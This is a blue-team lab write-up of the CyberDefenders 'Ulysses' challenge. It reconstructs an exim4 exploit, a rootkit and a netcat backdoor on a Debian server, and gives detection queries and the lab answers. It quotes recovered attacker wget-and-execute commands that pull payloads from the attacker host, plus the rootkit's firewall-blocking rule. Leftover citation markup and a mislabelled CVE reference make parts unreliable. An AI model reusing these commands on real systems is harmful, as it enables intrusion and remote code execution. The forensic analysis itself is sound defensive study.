---
date: 2026-07-04
platform: CyberDefenders
category: Endpoint Forensics
lab_name: Ulysses
source_url: https://cyberdefenders.org/blueteam-ctf-challenges/ulysses/
difficulty: Medium
time_taken: 1 hour
status: Completed
tags:
  - lab
mitre_techniques:
  - T1110.001, T1190, T1105, T1543.002, T1071.001, T1562.004, T1041
threat_actor:
---
# Ulysses

## Scenario

> The Ulysses lab presents a compromised Linux server. As a security analyst, the task is to investigate the incident using a combination of disk forensics (`victoria-v8.sda1.img`, examined via FTK Imager) and memory forensics (Volatility, with a custom Debian 5 profile) to uncover the attacker's entry point, actions on the system, and any data targeted or exfiltrated — including evidence of brute forcing, service exploitation, and deployment of malicious scripts/tools for persistence and control.

## Objective / Questions

- [x] Q1: Account targeted by the brute force attack (which triggered the alert)
- [x] Q2: Number of unique failed login attempts
- [x] Q3: Operating system running on the targeted server
- [x] Q4: Victim's IP address
- [x] Q5: Attacker's two IP addresses (ascending order)
- [x] Q6: PID of the `nc` (netcat) service running on the server
- [x] Q7: Service exploited to gain access (one word)
- [x] Q8: CVE number of the exploited vulnerability
- [x] Q9: Name of the compressed file downloaded by the attacker
- [x] Q10: Highest of the two ports involved in data exfiltration
- [x] Q11: Port the attacker tried to block on the firewall

## Tools Used

- FTK Imager (mounting `victoria-v8.sda1.img` read-only)
- `strings` + PowerShell `Select-String` / `Measure-Object` (log parsing/counting)
- `grep -r -E` (recursive log/config searching across the mounted image)
- Volatility 2 with a custom Linux profile (`Debian5_26.zip` → `LinuxDebian5_26x86`)
    - `linux_netstat` — network connections
    - `linux_psxview` — process enumeration/cross-view validation
- `tar -xzf` (extracting the attacker's downloaded rootkit archive)

## Analysis

### Initial Access / Entry Point

- A brute-force campaign against SSH targeted the **`ulysses`** account, sourced from **`192.168.56.1`** on port **34431**, recorded in `/var/log/auth.log` via `pam_unix(sshd:auth)` <cite index="5-3">"Failed password" entries</cite>. This brute force did **not** succeed (32 unique failed attempts, no corresponding success observed).
- Actual initial access was instead achieved by exploiting the **exim4** mail transfer agent, specifically **CVE-2010-4344**, <cite index="5-24">a flaw arising from improper handling of certain crafted inputs by the Exim daemon, allowing an attacker to execute arbitrary commands with elevated (root) privileges via a specially crafted request</cite>.
- Correlating log entries for the attacker IPs (`grep -r -E '192.168.56.[1|101]' /d/[root]`) surfaced <cite index="5-19">command execution tied to external communications and the exim4 service, matching a known public exploit for this CVE</cite>.

### Execution / Actions Observed

- Following successful RCE via exim4, the attacker executed shell commands directly as root, including a download-and-run pattern: `/bin/sh -c "wget http://192.168.56.1/c.pl -O /tmp/c.pl; perl /tmp/c.pl"`
- A second download command staged a rootkit archive: `/bin/sh -c "wget http://192.168.56.1/rk.tar -O /tmp/rk.tar; sleep 1000"`
- The `c.pl` Perl script was executed immediately upon download via the `perl` interpreter, functioning as the initial post-exploitation payload/backdoor dropper.

### Persistence

- The extracted rootkit archive (`rk.tar`) contained an `install.sh` script that, beyond firewall manipulation (see Defense Evasion), was structured to modify system startup files — appending its `iptables` rule not only live but also into `/etc/rc.d/rc.local` and `/etc/init.d/xfs3`, meaning the rootkit's configuration (and by extension its backdoor/service components) was designed to **persist across reboots** via standard SysV init startup scripts.
- A `netcat` (`nc`) process was found actively running (PID **2169**), consistent with use as a lightweight backdoor/listener for maintaining remote access — <cite index="5-16">nc is legitimately a networking/debugging utility, but here served to establish unauthorized backdoors or reverse shells for remote control of the compromised system</cite>.

### Privilege Escalation

- No separate escalation step was required: <cite index="5-24">the exim4 vulnerability allowed the attacker to bypass authentication mechanisms entirely and execute commands directly as the root user</cite>, so the RCE itself delivered full root access.

### Defense Evasion

- Malicious files were staged in `/tmp`, <cite index="5-27">a location that is frequently writable by all users and not closely monitored in many configurations</cite>, reducing the chance of casual discovery.
- The rootkit's `install.sh` inserted `iptables` `OUTPUT` DROP rules for TCP port `45295`, applied immediately and also persisted into two separate startup scripts — an attempt to **silently block outbound traffic on that port** (likely to prevent competing tools, other backdoors, or specific monitoring/callback traffic from using it, or to cloak the rootkit's own use of a different channel).
- Use of a generic-looking script name (`c.pl`) and a `.tar` archive extension for the rootkit are simple naming choices that don't overtly signal malicious intent at a glance.

### Lateral Movement

- No lateral movement beyond the single compromised host was identified in the provided evidence; all activity is scoped to the victim server and its two external counterpart IPs.

### C2 / Exfiltration

- Two attacker IP addresses identified via `linux_netstat`: **`192.168.56.1`** and **`192.168.56.101`** (ascending order), both showing `ESTABLISHED`/`CLOSE` connection states with the victim at the time of memory capture.
- Two remote ports were involved in the data-exfiltration-related connections: **`4444`** and **`8888`** — the higher of the two being **`8888`**. (Port 4444 is a classic Metasploit/reverse-shell default; 8888 is commonly used as an alternate C2/relay or file-transfer port.)
- The rootkit additionally attempted to **block outbound TCP port `45295`** at the firewall level via `iptables ... -j DROP`, persisted into startup scripts.

### Impact

- Full root-level compromise of a Debian Linux server via an unauthenticated MTA RCE, with a rootkit deployed for persistence, an active netcat backdoor process, and firewall manipulation to control outbound traffic — indicating attacker intent to retain long-term, controlled access to the host.

### Evidence Reviewed

- **Artifact:** `/var/log/auth.log` (mounted disk image, `victoria-v8.sda1.img`) **Finding:** Repeated `pam_unix(sshd:auth)` "Failed password" entries for account `ulysses` from `192.168.56.1:34431` **Why it matters:** Identifies the brute-forced account and confirms the (unsuccessful) attack vector alongside the source IP (Q1).
    
- **Artifact:** `auth.log`, parsed via `strings ... | Select-String -Pattern "Failed.*ulysses" | Measure-Object Line` **Finding:** 32 matching lines **Why it matters:** Quantifies the scale of the brute-force attempt (Q2).
    
- **Artifact:** `/etc/issue` (mounted disk image) **Finding:** `Debian GNU/Linux 5.0` **Why it matters:** Confirms OS/version, required to select the correct Volatility profile for later memory analysis (Q3).
    
- **Artifact:** Memory dump, `linux_netstat` plugin (custom `LinuxDebian5_26x86` profile) **Finding:** Local address `192.168.56.102` among active connections **Why it matters:** Identifies the victim's IP address (Q4).
    
- **Artifact:** Memory dump, `linux_netstat` plugin **Finding:** Remote IPs `192.168.56.1` and `192.168.56.101` in `ESTABLISHED`/`CLOSE` states **Why it matters:** Identifies both attacker IP addresses (Q5).
    
- **Artifact:** Memory dump, `linux_psxview` plugin filtered on `"nc"` **Finding:** Netcat process, PID `2169`, consistently visible across all cross-view enumeration methods (not hidden) **Why it matters:** Confirms an active netcat backdoor and its PID (Q6).
    
- **Artifact:** `grep -r -E '192.168.56.[1|101]' /d/[root]` across the mounted image **Finding:** Command execution entries tied to `exim4` and a `wget`+`perl` download-and-execute pattern **Why it matters:** Identifies the exploited service and initial post-exploitation payload delivery (Q7, Q8).
    
- **Artifact:** Command-execution log entries (exim4-triggered shell) **Finding:** `wget http://192.168.56.1/rk.tar -O /tmp/rk.tar` and `wget http://192.168.56.1/c.pl -O /tmp/c.pl; perl /tmp/c.pl`; `/tmp` directory listing confirms `rk.tar` present (~4.3 MB) **Why it matters:** Identifies both downloaded files and confirms the compressed one (Q9).
    
- **Artifact:** Extracted `rk.tar` → `install.sh` **Finding:** `iptables -I OUTPUT 1 -p tcp --dport 45295 -j DROP`, applied live and persisted into `/etc/rc.d/rc.local` and `/etc/init.d/xfs3` **Why it matters:** Identifies the specific port the attacker blocked at the firewall and confirms the rootkit's persistence mechanism (Q11).
    

## Timeline

|Time (UTC)|Event|Source|
|---|---|---|
|T0|SSH brute-force attempts against `ulysses` from `192.168.56.1:34431` (32 unique failures, unsuccessful)|`auth.log`|
|T0+|Exploitation of exim4 (CVE-2010-4344) achieves RCE as root|Correlated grep of attacker IPs across logs|
|T1|`wget http://192.168.56.1/c.pl -O /tmp/c.pl; perl /tmp/c.pl` — payload downloaded and executed|Command execution log|
|T1|`wget http://192.168.56.1/rk.tar -O /tmp/rk.tar; sleep 1000` — rootkit archive downloaded|Command execution log|
|T2|`rk.tar` extracted; `install.sh` run, deploying `iptables` DROP rule for port 45295 (live + persisted)|Extracted archive contents|
|T2+|Netcat process (PID 2169) established/running for backdoor access|Memory dump (`linux_psxview`)|
|Capture time|Two external connections active/closed with victim: `192.168.56.1` and `192.168.56.101`, ports incl. `4444` and `8888`|Memory dump (`linux_netstat`)|

## Threat Actor / Attribution

- **Group / Campaign:** Not attributed to a named group in this lab; scenario reflects a generic/opportunistic single-actor compromise chain (brute force → service exploitation → rootkit deployment).
- **Confidence:** N/A (lab scenario; no attribution evidence collected).
- **Basis for attribution:** N/A — investigation focused on technical reconstruction rather than actor attribution.

## Indicators / Artifacts

### Network

- `192.168.56.1` — attacker IP (brute-force source; also hosted `c.pl` and `rk.tar` payloads)
- `192.168.56.101` — second attacker IP (established/closed connection to victim)
- Ports `4444`, `8888` — remote ports involved in exfiltration-related connections
- Port `45295` (TCP) — outbound port the rootkit blocked via `iptables`

### Host

- `/tmp/c.pl` — Perl payload downloaded and executed via exim4 RCE
- `/tmp/rk.tar` — ~4.3 MB rootkit archive
- `install.sh` (inside `rk.tar`) — rootkit installer, modifies firewall rules and startup scripts
- `/etc/rc.d/rc.local`, `/etc/init.d/xfs3` — startup scripts modified for persistence of the firewall rule
- Netcat process, PID `2169` — active backdoor/listener

### Cloud

- N/A — this lab is scoped to on-premises disk and memory forensics, no cloud artifacts.

### Actor Infrastructure

- Attacker-hosted payload server at `192.168.56.1` serving both `c.pl` and `rk.tar` over HTTP.

## MITRE ATT&CK Mapping

|Tactic|Technique|ID|
|---|---|---|
|Credential Access|Brute Force: Password Guessing|T1110.001|
|Initial Access|Exploit Public-Facing Application (exim4 / CVE-2010-4344)|T1190|
|Command and Control / Execution|Ingress Tool Transfer|T1105|
|Persistence|Create or Modify System Process: Systemd/SysV Service (startup script modification)|T1543.002|
|Command and Control|Application Layer Protocol: Web Protocols|T1071.001|
|Defense Evasion|Impair Defenses: Disable or Modify System Firewall|T1562.004|
|Exfiltration|Exfiltration Over C2 Channel|T1041|

## Detection Opportunities

```kql
// 1) Detect SSH brute-force patterns against a single account
AuthLogs
| where Message has "Failed password" and Message has "ulysses"
| summarize FailedAttempts = count() by SourceIP, bin(Timestamp, 10m)
| where FailedAttempts > 10

// 2) Detect exim4 spawning a shell (classic RCE post-exploitation pattern)
ProcessEvents
| where ParentProcessName == "exim4" and ProcessName in ("sh", "bash")

// 3) Detect wget/curl-then-execute download cradles
ProcessEvents
| where ProcessCommandLine matches regex @"(wget|curl).*-O\s*/tmp/.*;\s*(perl|python|bash|sh)\s"

// 4) Detect iptables rule insertion that DROPs a specific outbound port, especially when persisted to startup scripts
ProcessEvents
| where ProcessCommandLine has "iptables" and ProcessCommandLine has "DROP"
FileEvents
| where FilePath in ("/etc/rc.d/rc.local", "/etc/init.d/xfs3") and EventType == "Modified"

// 5) Detect netcat listeners/backdoors
ProcessEvents
| where ProcessName == "nc" or ProcessCommandLine has "netcat"
```

## Answers / Flags

|Question|Answer|
|---|---|
|Q1|`ulysses`|
|Q2|`32`|
|Q3|`Debian GNU/Linux 5.0`|
|Q4|`192.168.56.102`|
|Q5|`192.168.56.1, 192.168.56.101`|
|Q6|`2169`|
|Q7|`exim4` (Exim/exim)|
|Q8|`CVE-2010-4344`|
|Q9|`rk.tar`|
|Q10|`8888`|
|Q11|`45295`|

## Key Takeaways

- A loud, unsuccessful brute-force attack can be a **decoy or unrelated noise** relative to the actual initial-access vector — here the real entry point was a service exploit (exim4/CVE-2010-4344), not the SSH brute force against `ulysses`. Always verify whether the "obvious" attack actually succeeded before treating it as the root cause.
- CVE-2010-4344 is a good reminder that **old, unpatched MTA software** (Exim in this case) remains a viable RCE vector on legacy Linux boxes — worth checking service versions early in any Linux IR engagement.
- `linux_psxview`'s cross-view validation is valuable specifically because it can catch **hidden/cloaked processes**; confirming netcat was visible across all views here still matters as a baseline technique even when nothing was hidden.
- Rootkit installers that both apply a firewall rule live _and_ write it into multiple startup scripts (`rc.local`, an init.d script) are a strong persistence signal — file integrity monitoring on `/etc/rc.d/` and `/etc/init.d/` would have caught this quickly.
- Correlating disk (logs, extracted rootkit contents) with memory (`linux_netstat`, `linux_psxview`) was necessary to get the complete picture — the disk showed _how_ they got in and persisted, while memory showed _what was live_ at capture time (netcat PID, active connections/ports).

## References

- CyberDefenders Ulysses lab official walkthrough
- CVE-2010-4344 (Exim `perl_startup` RCE) — Exploit-DB reference
- Volatility 2 Linux profile build process for Debian 5.x memory images
